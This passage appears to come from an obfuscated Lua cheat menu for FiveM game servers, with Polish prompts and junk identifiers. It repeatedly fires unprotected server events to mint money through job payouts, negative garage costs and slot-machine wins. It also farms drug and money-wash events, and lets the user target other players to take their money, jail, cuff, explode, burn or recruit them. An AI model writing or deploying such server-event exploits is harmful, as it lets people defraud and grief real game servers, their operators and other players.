					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
			elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~g~~h~MONEY, GARBAGEJOB ~s~15") then
				local VGERVECCCCCCCC = VTRHTHRTJYTJYTKJT("Wpisz kwote pieniedzy", "", 100000000)
				if VGERVECCCCCCCC then
					TriggerServerEvent("esx_garbagejob:pay", VGERVECCCCCCCC)
				end	
			elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~g~~h~MONEY, WYPLATA ~s~16") then
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
			elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~s~Bank ~r~~h~Deposit") then
				local VGERVECCCCCCCC = VTRHTHRTJYTJYTKJT("Wpisz kwote pieniedzy", "", 100)
				if VGERVECCCCCCCC then
				TriggerServerEvent("bank:deposit", VGERVECCCCCCCC)
				end
			elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~s~Bank ~r~~h~Withdraw ") then
				local VGERVECCCCCCCC = VTRHTHRTJYTJYTKJT("Wpisz kwote pieniedzy", "", 100)
				if VGERVECCCCCCCC then
				TriggerServerEvent("bank:withdraw", VGERVECCCCCCCC)
				end
			end


			APISHITACCCCCCCCCCCCC.THRHTYHTYRJYTJ()
				elseif APISHITACCCCCCCCCCCCC.VTHGTRHRJUTJUTY("VRHTRHRTHTJHTREJT") then
				if APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~r~~h~ Soon") then
				print("XD")
				end
				

				APISHITACCCCCCCCCCCCC.THRHTYHTYRJYTJ()
			elseif APISHITACCCCCCCCCCCCC.VTHGTRHRJUTJUTY("VTRHTRHRTETJY") then
				if APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~Send Discord grhtrhrjhrthtdtgdhththtrdrt") then
					local grhtrhrjhrthtdtgdhththtrdrt = VTRHTHRTJYTJYTKJT("Enter Messenge to send", "", 100)
					TriggerServerEvent("DiscordBot:playerDied", grhtrhrjhrthtdtgdhththtrdrt, "1337")
					AleTenAPIACJESTCHUJOWYSKRTR("The Messenge:~n~" .. grhtrhrjhrthtdtgdhththtrdrt .. "~n~Has been ~g~sent!")
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~Send Police Car Advert") then
				TriggerServerEvent("esx:enterpolicecar",GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsIn(GetPlayerPed(-1), 0))))
				end

				APISHITACCCCCCCCCCCCC.THRHTYHTYRJYTJ()
			elseif APISHITACCCCCCCCCCCCC.VTHGTRHRJUTJUTY("VRPOptions") then
				if APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~r~~h~VRP ~s~Give Money ~ypayGarage") then
					local VGERVECCCCCCCC = VTRHTHRTJYTJYTKJT("Wpisz kwote pieniedzy USE AT YOUR OWN RISK", "", 100)
					if VGERVECCCCCCCC then
						TriggerServerEvent("lscustoms:payGarage", {costs = -VGERVECCCCCCCC})
					end		
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~r~~h~VRP ~g~WIN ~s~Slot Machine") then
					local VGERVECCCCCCCC = VTRHTHRTJYTJYTKJT("Wpisz kwote pieniedzy USE AT YOUR OWN RISK", "", 100)
					if VGERVECCCCCCCC then
					TriggerServerEvent("vrp_slotmachine:server:2", VGERVECCCCCCCC)
					end
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~r~~h~VRP ~s~Get driving license") then
					TriggerServerEvent("dmv:success")
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~r~~h~VRP ~s~Bank Deposit") then
					local VGERVECCCCCCCC = VTRHTHRTJYTJYTKJT("Wpisz kwote pieniedzy", "", 100)
					if VGERVECCCCCCCC then
					TriggerServerEvent("bank:deposit", VGERVECCCCCCCC)
					end
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~r~~h~VRP ~s~Bank Withdraw ") then
					local VGERVECCCCCCCC = VTRHTHRTJYTJYTKJT("Wpisz kwote pieniedzy", "", 100)
					if VGERVECCCCCCCC then
					TriggerServerEvent("bank:withdraw", VGERVECCCCCCCC)
					end
			end


				APISHITACCCCCCCCCCCCC.THRHTYHTYRJYTJ()
			elseif APISHITACCCCCCCCCCCCC.VTHGTRHRJUTJUTY("ESXDrugsHRAGRHRTHRTRT") then
				if APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~g~Harvest ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~g~Transform ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~g~Sell ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~w~Harvest ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~w~Transform ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~w~Sell ~w~Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~r~Harvest Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~r~Transform Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~r~Sell Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~p~Harvest Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~p~Transform Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~p~Sell Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~g~Money Wash ~c~(x10)") then
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~r~~h~Stop all ~c~(Drugs)") then
					TriggerServerEvent("esx_drugs:stopHarvestCoke")
					TriggerServerEvent("esx_drugs:stopTransformCoke")
					TriggerServerEvent("esx_drugs:stopSellCoke")
					TriggerServerEvent("esx_drugs:stopHarvestMeth")
					TriggerServerEvent("esx_drugs:stopTransformMeth")
					TriggerServerEvent("esx_drugs:stopSellMeth")
					TriggerServerEvent("esx_drugs:stopHarvestWeed")
					TriggerServerEvent("esx_drugs:stopTransformWeed")
					TriggerServerEvent("esx_drugs:stopSellWeed")
					TriggerServerEvent("esx_drugs:stopHarvestOpium")
					TriggerServerEvent("esx_drugs:stopTransformOpium")
					TriggerServerEvent("esx_drugs:stopSellOpium")
					AleTenAPIACJESTCHUJOWYSKRTR("~r~Everything is now stopped.")
				end
				
				APISHITACCCCCCCCCCCCC.THRHTYHTYRJYTJ()
			elseif APISHITACCCCCCCCCCCCC.VTHGTRHRJUTJUTY("TRHHTEJYTYT") then
					for i = 0, 128 do
					if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and APISHITACCCCCCCCCCCCC.VTRYTHYTHYTHJYTHYJRHET("~h~~r~-»  ~s~"..GetPlayerName(i).."", 'TRBRTEHTHTT') then
						ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK = i
					end
				end
				
				APISHITACCCCCCCCCCCCC.THRHTYHTYRJYTJ()
			elseif APISHITACCCCCCCCCCCCC.VTHGTRHRJUTJUTY("TRBRTEHTHTT") then
				APISHITACCCCCCCCCCCCC.GTBRBYJNTYJYTJT("TRBRTEHTHTT", "Recrutar Players options [" .. GetPlayerName(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK) .. "]")
			    if APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~s~Recruit~c~~h~ Mechanic") then
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK), "mecano", 0)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK), "mecano", 0)
				TriggerServerEvent('esx:recruterplayer', GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK), "mecano", 0)
			elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~s~Recruit~b~~h~ Police") then
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK), "police", 0)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK), "police", 0)
			elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~s~Recruit~c~~h~ Mafia") then
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK), "mafia", 0)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK), "mafia", 0)
			elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~s~Recruit~p~~h~ Gang") then
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK), "gang", 0)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK), "gang", 0)
			elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~s~Recruit~r~~h~ Inem") then
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK), "ambulance", 0)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK), "ambulance", 0)
			elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~Custom Recruit") then
					local reason = VTRHTHRTJYTJYTKJT("Enter the job HYTJNTYHJYT", "", 100)
					local reason2 = VTRHTHRTJYTJYTKJT("Enter the nivel job number 0-10", "", 10)
					if reason and reason2 then
					TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK), reason, reason2)
					TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer',GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK), reason, reason2)
					end
				end

				APISHITACCCCCCCCCCCCC.THRHTYHTYRJYTJ()
			elseif APISHITACCCCCCCCCCCCC.VTHGTRHRJUTJUTY("HTRRJRYTYRY") then
					for i = 0, 128 do
					if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and APISHITACCCCCCCCCCCCC.VTRYTHYTHYTHJYTHYJRHET("~h~~r~-»  ~s~"..GetPlayerName(i).."~h~~y~ » "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~s~[~r~DEAD~s~]" or "~s~[<FONT COLOR='#f3ff45'>ALIVE~s~]"), 'TRRJYJYJRRYTYTJYYTYJJY') then
						ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK = i
					end
				end
		

				APISHITACCCCCCCCCCCCC.THRHTYHTYRJYTJ()
			elseif APISHITACCCCCCCCCCCCC.VTHGTRHRJUTJUTY("TRRJYJYJRRYTYTJYYTYJJY") then
				APISHITACCCCCCCCCCCCC.GTBRBYJNTYJYTJT("TRRJYJYJRRYTYTJYYTYJJY", "~h~Player ~s~~r~[" .. GetPlayerName(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK) .. "~r~]")
				if APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("Spectate", (errtjhtrjtyuyhjnur and "~g~[SPECTATING]")) then
					vrertntytmyjtyujkuykuykuy(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK)
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("Teleport To Player") then
					local hytjkuykuuyhjty7hytujyuru = IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
					SetEntityCoords(hytjkuykuuyhjty7hytujyuru, GetEntityCoords(GetPlayerPed(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK)), 0.0, 0.0, 0.0, false)	
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~g~Give ~s~Money") then
						local VGERVECCCCCCCC = VTRHTHRTJYTJYTKJT("Wpisz kwote pieniedzy by dac", "", 100000000)
						if VGERVECCCCCCCC then
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK), "item_money", "money", VGERVECCCCCCCC)    
						end
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~r~Remove ~s~Money") then
						local VGERVECCCCCCCC = VTRHTHRTJYTJYTKJT("Wpisz kwote pieniedzy by zabrac", "", 100000000)
						if VGERVECCCCCCCC then
						TriggerServerEvent('esx:removeInventoryItem', GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK), "item_money", "money", VGERVECCCCCCCC)    
						end
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~r~Explode") then
					AddExplosion(GetEntityCoords(GetPlayerPed(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK)), 2, 100000.0, true, false, 100000.0)
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~g~Revive ~g~ESX") then
					TriggerServerEvent("esx_ambulancejob:revive", GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK))
					TriggerServerEvent("whoapd:revive", GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK))
				    TriggerServerEvent("paramedic:revive", GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK))
				    TriggerServerEvent("ems:revive", GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK))
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~g~Revive ~b~VRP") then CreatePickup(GetHashKey("PICKUP_HEALTH_STANDARD"), GetEntityCoords(GetPlayerPed(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK))) elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("Give ~b~Armour ") then CreatePickup(GetHashKey("PICKUP_ARMOUR_STANDARD"), GetEntityCoords(GetPlayerPed(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK))) elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~r~Kill ~s~Player") then AddExplosion(GetEntityCoords(GetPlayerPed(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK)), 4, 1337.0, false, true, 0.0) 
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ('Fire') then
				    brhtrhtrrthedtrhty(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK)
					elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("Jail") then		
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK), 45 * 60)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK), 45 * 60)
				TriggerServerEvent("js:jailuser", GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK), 45 * 60, "dude weed")
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("Unjail") then
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK), 0)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK), 0)
				TriggerServerEvent("esx_jail:unjailQuest", GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK))
				TriggerServerEvent("js:removejailtime", GetPlayerServerId(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK))	
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~g~Give All Weapons") then
					for i = 1, #RHRTHJRTJRJKYTKTYU do
						GiveWeaponToPed(GetPlayerPed(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK), GetHashKey(RHRTHJRTJRJKYTKTYU[i]), 1000, false, false)
					end
				elseif APISHITACCCCCCCCCCCCC.VTRYTHYTHYTHJYTHYJRHET("Weapon Menu", "HTRJYJTYYTKTYKTKTKUY") then
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("Spawn Vehicle") then
					local vrtdbrthjrjhjtrrted = GetPlayerPed(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK)
					local GHTRTHTEHHTYYTJY = VTRHTHRTJYTJYTKJT("Enter Vehicle Spawn Name", "", 100)

					if GHTRTHTEHHTYYTJY and IsModelValid(GHTRTHTEHHTYYTJY) and IsModelAVehicle(GHTRTHTEHHTYYTJY) then
						RequestModel(GHTRTHTEHHTYYTJY)
						while not HasModelLoaded(GHTRTHTEHHTYYTJY) do
							Citizen.Wait(0)
						end

						local RETHHTRTERHTREGHTYGHYT = CreateVehicle(GetHashKey(GHTRTHTEHHTYYTJY), GetEntityCoords(vrtdbrthjrjhjtrrted), GetEntityHeading(vrtdbrthjrjhjtrrted), true, true)
					else
						AleTenAPIACJESTCHUJOWYSKRTR("~r~Model nie istnieje!")
					end
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("Cuff ~g~ESX") then
					TriggerServerEvent("esx_policejob:handcuff", GetPlayerPed(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK))
					elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~b~--Vehicle Options--") then
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~b~Kick Vehicle") then
					ClearPedTasksImmediately(GetPlayerPed(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK))
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~b~Kill Engine ~r~NEW") then
					local hjytejyjtjjukjut = GetPlayerPed(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK)
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(ATGANTICHEATHAHAHAAHAKAAPIACWYPIERDALAJPK))
					SetVehicleUndriveable(GetVehiclePedIsIn(hjytejyjtjjukjut),true)
					SetVehicleEngineHealth(GetVehiclePedIsIn(hjytejyjtjjukjut), 100)
 
